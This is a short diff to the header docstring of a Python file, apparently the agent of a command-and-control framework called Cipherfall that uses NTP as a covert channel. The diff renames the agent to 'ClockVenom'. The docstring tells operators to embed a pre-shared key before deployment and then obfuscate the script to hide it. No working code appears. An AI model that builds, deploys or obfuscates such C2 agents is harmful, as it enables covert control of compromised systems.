@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-agent.py — Cipherfall NTP C2 Agent (fallback channel)
+ClockVenom (agent.py) — Cipherfall NTP C2 Agent
 
 Bake C2_PSK into the script before deployment, then obfuscate with
 Modules/Obfuscator/obfuscator_py.py.
